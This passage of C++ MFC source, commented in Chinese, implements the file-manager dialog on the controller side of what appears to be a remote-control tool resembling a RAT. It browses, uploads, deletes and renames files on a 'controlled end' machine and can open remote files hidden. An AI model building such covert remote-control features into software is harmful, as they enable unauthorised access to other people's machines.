// FileManagerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "IOCPServer.h"
#include "Common.h"
#include "InputDialog.h"
#include "FileTransferModeDlg.h"



typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

static UINT indicators[] =
{
	ID_SEPARATOR,           
	ID_SEPARATOR,
	ID_SEPARATOR
};

// CFileManagerDlg 对话框

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialog)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",                   //随便传递两个字节
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES    //图标
		);
	m_hIcon = sfi.hIcon;	


	HIMAGELIST hImageList;
	// 加载系统图标列表
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	// 加载系统图标列表
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	//得到连接被控端的IP
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	// 保存远程驱动器列表
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = false;   //OninitDialog中处理发送来的信息



}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_LOCAL, &CFileManagerDlg::OnDblclkListLocal)
	ON_COMMAND(IDM_LOCAL_BIGICON, &CFileManagerDlg::OnLocalBigicon)
	ON_COMMAND(IDM_LOCAL_SMALLICON, &CFileManagerDlg::OnLocalSmallicon)
	ON_COMMAND(IDM_LOCAL_LIST, &CFileManagerDlg::OnLocalList)
	ON_COMMAND(IDM_LOCAL_REPORT, &CFileManagerDlg::OnLocalReport)
	ON_COMMAND(IDM_REMOTE_BIGICON, &CFileManagerDlg::OnRemoteBigicon)
	ON_COMMAND(IDM_REMOTE_SMALLICON, &CFileManagerDlg::OnRemoteSmallicon)
	ON_COMMAND(IDM_REMOTE_LIST, &CFileManagerDlg::OnRemoteList)
	ON_COMMAND(IDM_REMOTE_REPORT, &CFileManagerDlg::OnRemoteReport)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, &CFileManagerDlg::OnDblclkListRemote)
	ON_COMMAND(IDT_LOCAL_PREV, &CFileManagerDlg::OnIdtLocalPrev)
	ON_COMMAND(IDT_REMOTE_PREV, &CFileManagerDlg::OnIdtRemotePrev)
	ON_COMMAND(IDT_LOCAL_NEWFOLDER, &CFileManagerDlg::OnIdtLocalNewfolder)
	ON_COMMAND(IDM_RENAME, &CFileManagerDlg::OnRename)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_LOCAL, &CFileManagerDlg::OnNMRClickListLocal)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnEndlabeleditListLocal)
	ON_COMMAND(IDM_DELETE, &CFileManagerDlg::OnDelete)
	ON_COMMAND(IDT_LOCAL_DELETE, &CFileManagerDlg::OnIdtLocalDelete)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnEndlabeleditListRemote)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMRClickListRemote)
	ON_COMMAND(IDT_REMOTE_DELETE, &CFileManagerDlg::OnIdtRemoteDelete)
	ON_COMMAND(IDT_REMOTE_NEWFOLDER, &CFileManagerDlg::OnIdtRemoteNewfolder)
	ON_COMMAND(IDM_NEWFOLDER, &CFileManagerDlg::OnNewfolder)
	ON_COMMAND(IDM_REFRESH, &CFileManagerDlg::OnRefresh)
	ON_COMMAND(IDT_LOCAL_COPY, &CFileManagerDlg::OnIdtLocalCopy)
	ON_COMMAND(IDT_REMOTE_COPY, &CFileManagerDlg::OnIdtRemoteCopy)
	ON_COMMAND(IDM_TRANSFER, &CFileManagerDlg::OnTransfer)
	ON_COMMAND(IDM_LOCAL_OPEN, &CFileManagerDlg::OnLocalOpen)
	ON_COMMAND(IDM_REMOTE_OPEN_SHOW, &CFileManagerDlg::OnRemoteOpenShow)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, &CFileManagerDlg::OnRemoteOpenHide)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_LOCAL, &CFileManagerDlg::OnLvnBegindragListLocal)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_REMOTE, &CFileManagerDlg::OnLvnBegindragListRemote)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_COMMAND(IDT_LOCAL_STOP, &CFileManagerDlg::OnIdtLocalStop)
	ON_COMMAND(IDT_REMOTE_STOP, &CFileManagerDlg::OnIdtRemoteStop)
	ON_CBN_SELCHANGE(IDC_REMOTE_PATH, &CFileManagerDlg::OnCbnSelchangeRemotePath)
END_MESSAGE_MAP()





///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////该类的接受数据的响应
void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: 
		{
			FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0),m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			break;
		}

	case TOKEN_RENAME_FINISH:
		{
			// 刷新远程文件列表
			GetRemoteFileList(".");
			break;
		}

	case TOKEN_DELETE_FINISH:
		{
			EndRemoteDeleteFile();     //
			break;

		}
	case TOKEN_CREATEFOLDER_FINISH:
		{
			GetRemoteFileList(".");
			break;

		}
	case TOKEN_DATA_CONTINUE:        //发送数据                                      从主控端到被控端
		{
			SendFileData();
			break;
		}

	case TOKEN_TRANSFER_FINISH:      //传输完成                                      从被控端到主控端
		{
			EndLocalRecvFile();
			break;
		}

	case TOKEN_FILE_SIZE:           //传输文件时的第一个数据包，文件大小，及文件名    从被控端到主控端
		{
			CreateLocalRecvFile();
			break;
		}

	case TOKEN_FILE_DATA:           // 文件内容
		{
			WriteLocalRecvFile();   //主控端接收到数据将数据写入文件
			break;
		}


	case TOKEN_GET_TRANSFER_MODE:   //主控制端发送的文件被控端中存在就会接受到被控端的该消息
		{
			SendTransferMode();
			break;
		}
	default:
		SendException();
		break;
	}
}




// CFileManagerDlg 消息处理程序


BOOL CFileManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	RECT	rect;
	GetClientRect(&rect);


	//主控端
	if (!m_wndToolBar_Local.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_LOCAL) 
		||!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR_LOCAL))
	{
	
		return -1;
	}
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Local.LoadTrueColorToolBar
		(
		24,    //加载真彩工具条
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按钮
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);



	//被控端
	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_REMOTE) 
		||!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR_REMOTE))
	{
		TRACE0("Failed to create toolbar ");
		return -1; //Failed to create
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_wndToolBar_Remote.LoadTrueColorToolBar
		(
		24,    //加载真彩工具条    
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE
		);
	// 添加下拉按钮
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_REMOTE_VIEW, IDR_REMOTE_VIEW);

	//显示工具栏
	m_wndToolBar_Local.MoveWindow(268, 10, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);


	// 设置标题
	CString str;
	str.Format("\\\\%s - 文件管理",m_IPAddress);
	SetWindowText(str);

	// 为列表视图设置ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);



	// 创建带进度条的状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		return -1;      
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	m_wndStatusBar.GetItemRect(1, &rect);
	
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围 100 
	m_ProgressCtrl->SetPos(0);                  //设置进度条当前位置

	


	//这里是初始化本地驱动器列表并将本地驱动器列表显示到列表中
	FixedLocalDriveList();
	//这里是初始化驱动器列表并将服务端传递进来的信息显示到列表中
	FixedRemoteDriveList();

	m_nDragIndex = -1;
	m_nDropIndex = -1;
	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->GetWindow(GW_CHILD)->m_hWnd, SHACF_FILESYSTEM);


	return TRUE; 
}



void CFileManagerDlg::OnClose()
{

	CoUninitialize();   //卸载窗口上的Com库
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}





///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////主控端的跟新驱动器列表
void CFileManagerDlg::FixedLocalDriveList()
{
	char	DriveString[256];
	char	*pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	//初始化列表信息
	m_list_local.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "类型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);

	
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	char	FileSystem[MAX_PATH];
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间
	
	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		// 得到磁盘相关信息
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);

		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		if (GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}


		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));    //获得系统的图标
		m_list_local.SetItemData(nItem, 1);
	
		if (lstrlen(FileSystem) == 0)
		{
			SHFILEINFO	sfi;
			SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
			m_list_local.SetItemText(nItem, 1, sfi.szTypeName);
		}
		else
		{
			m_list_local.SetItemText(nItem, 1, FileSystem);
		}
		CString	str;
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_local.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_local.SetItemText(nItem, 3, str);
	}
	// 重置本地当前路径
	
	m_Local_Directory_ComboBox.ResetContent();

	
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListLocal控件上的双击左键消息
void CFileManagerDlg::OnDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult)     
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	if (m_list_local.GetSelectedCount() == 0 || m_list_local.GetItemData(m_list_local.GetSelectionMark()) != 1)
		return;
	FixedLocalFileList();
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListLocal控件上完成编辑的处理响应
void CFileManagerDlg::OnLvnEndlabeleditListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);
	CString str, strExistingFileName, strNewFileName;
	m_list_local.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Local_Path + str;
	*pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));                  //文件的重命名

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////在ListLocal控件上的右键单击弹出菜单消息
void CFileManagerDlg::OnNMRClickListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CListCtrl	*pListCtrl = &m_list_local;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);   //加载菜单    // Fview
	CMenu*	pM = popup.GetSubMenu(0);                // shanf  dfjkdjf   djfkdfjkdf
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(6, MF_BYPOSITION);
	if (pListCtrl->GetSelectedCount() == 0)    //ControlList
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)    //1
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// 是文件夹
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
		else
			pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////主控端的文件列表
void CFileManagerDlg::FixedLocalFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_local.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_local.GetItemData(nItem) == 1)
			{
				directory = m_list_local.GetItemText(nItem, 0);   
			}
		}
		// 从组合框里得到路径
		else
		{
			m_Local_Directory_ComboBox.GetWindowText(m_Local_Path);
		}
	}




	// 得到父目录
	if (directory == "..")
	{
		m_Local_Path = GetParentDirectory(m_Local_Path);
	}
	// 刷新当前用
	else if (directory != ".")
	{	
		m_Local_Path += directory;
		if(m_Local_Path.Right(1) != "\\")
			m_Local_Path += "\\";
	}


	// 是驱动器的根目录,返回磁盘列表
	if (m_Local_Path.GetLength() == 0)  //
	{
		FixedLocalDriveList();
		return;
	}

	m_Local_Directory_ComboBox.InsertString(0, m_Local_Path);
	m_Local_Directory_ComboBox.SetCurSel(0);

	// 重建标题
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0) != 0);
	m_list_local.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int			nItemIndex = 0;
	m_list_local.SetItemData
		(
		m_list_local.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);

	// i 为 0 时列目录，i 为 1时列文件
	for (int i = 0; i < 2; i++)
	{
		CFileFind	file;
		BOOL		bContinue;
		bContinue = file.FindFile(m_Local_Path + "*.*");
		while (bContinue)
		{	
			bContinue = file.FindNextFile();
			if (file.IsDots())	
				continue;
			bool bIsInsert = !file.IsDirectory() == i;

			if (!bIsInsert)
				continue;

			int nItem = m_list_local.InsertItem(nItemIndex++, file.GetFileName(), 
				GetIconIndex(file.GetFileName(), GetFileAttributes(file.GetFilePath())));
			m_list_local.SetItemData(nItem,	file.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(file.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
			m_list_local.SetItemText(nItem, 2, sfi.szTypeName);

			CString str;
			str.Format("%10d KB", file.GetLength() / 1024 + (file.GetLength() % 1024 ? 1 : 0));
			m_list_local.SetItemText(nItem, 1, str);
			CTime time;
			file.GetLastWriteTime(time);
			m_list_local.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
		}
	}


}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);

	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////真彩菜单
void CFileManagerDlg::OnIdtLocalPrev()                                                                                       //真彩返回上层目录
{
	// TODO: 在此添加命令处理程序代码

	FixedLocalFileList("..");
}


void CFileManagerDlg::OnIdtLocalNewfolder()                                                                                  //真彩创建新的目录
{
	if (m_Local_Path == "")
		return;


	CInputDialog	dlg;
	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		// 创建多层目录
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
		FixedLocalFileList(".");
	}
}



void CFileManagerDlg::OnIdtLocalDelete()                                                                                     //真彩删除目录或者文件
{
	m_bIsUpload = true;                                                                        //我们可以使用这个Flag进行停止 当前的工作
	CString str;
	if (m_list_local.GetSelectedCount() > 1)
		str.Format("确定要将这 %d 项删除吗?", m_list_local.GetSelectedCount());
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);

		int a = m_list_local.GetSelectionMark();   //  suan

		if (a==-1)
		{
			return;
		}
		if (m_list_local.GetItemData(a) == 1)   //[]
			str.Format("确实要删除文件夹“%s”并将所有内容删除吗?", file);
		else
			str.Format("确实要把“%s”删除吗?", file);
	}
	if (::MessageBox(m_hWnd, str, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition();  //  20  21 3
	while(pos)
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);   //C:\
		// 如果是目录
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			DeleteDirectory(file);
		}
		else
		{
			DeleteFile(file);
		}
	} 
	// 禁用文件管理窗口
	EnableControl(TRUE);

	FixedLocalFileList(".");
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];

	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);

	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // 关闭查找句柄

	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}


void CFileManagerDlg::OnLocalBigicon()																					      //真彩显示数据的状态
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}


void CFileManagerDlg::OnLocalSmallicon()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}


void CFileManagerDlg::OnLocalList()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}


void CFileManagerDlg::OnLocalReport()
{
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}


void CFileManagerDlg::OnIdtLocalStop()																						//真彩停止功能
{
	m_bIsStop = true;
}



void CFileManagerDlg::OnIdtLocalCopy()																						 //真彩传输功能  从主控端到被控端
{
	m_bIsUpload = true;
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);                            //拖拉拽功能中用到
	m_Remote_Upload_Job.RemoveAll();                                                                   
	POSITION pos = m_list_local.GetFirstSelectedItemPosition();
	while(pos) 
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			FixedUploadDirectory(file.GetBuffer(0));
		}
		else
		{
			// 添加到上传任务列表中去
			m_Remote_Upload_Job.AddTail(file);
		}

	} 
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();                           //发送第一个任务
}



BOOL CFileManagerDlg::SendUploadJob()																						//从主控端到被控端的发送任务
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Remote_Path;
	// 如果远程也有选择，当做目标文件夹
	int nItem = m_list_remote.GetSelectionMark();

	// 是文件夹
	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";     //这里从ComBox控件中选择的路径
	}

	if (!m_hCopyDestFolder.IsEmpty())                      //这里是使用拖拉拽拷贝文件使用的路径
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}


	m_strOperatingFile = m_Remote_Upload_Job.GetHead();    //获得第一个任务的名称

	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile;               // 远程文件

	// 得到要保存到的远程的文件路径
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;


	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);   //获得要发送文件的大小
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_FILE_SIZE;

	//向被控端发送消息COMMAND_FILE_SIZE   被控端会执行CreateLocalRecvFile函数从而分成两中情况一种是要发送文件已经存在就会接收到       TOKEN_GET_TRANSFER_MODE 
	//																					   另一种是被控端调用GetFileData函数从而接收到TOKEN_DATA_CONTINUE


	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);

	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}



void CFileManagerDlg::SendTransferMode()																					//如果主控端发送的文件在被控端上存在提示如何处理  
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDCANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));
}


void CFileManagerDlg::EndLocalUploadFile()																						//如果有任务就继续发送没有就恢复界面	                       
{

	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");

	}
	else
	{

		Sleep(5);
		SendUploadJob();
	}
	return;
}




void CFileManagerDlg::OnLocalOpen()																							 //菜单本地打开
{
	CString	str;
	str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
	ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////真彩菜单






bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)    
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;
	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if(pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
		{
			p++;          
			p++;           

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

		}
		else if(*(p+1) == TEXT(':')) 
		{
			p++;
			p++;
			if(*p && (*p == TEXT('\\')))
			{
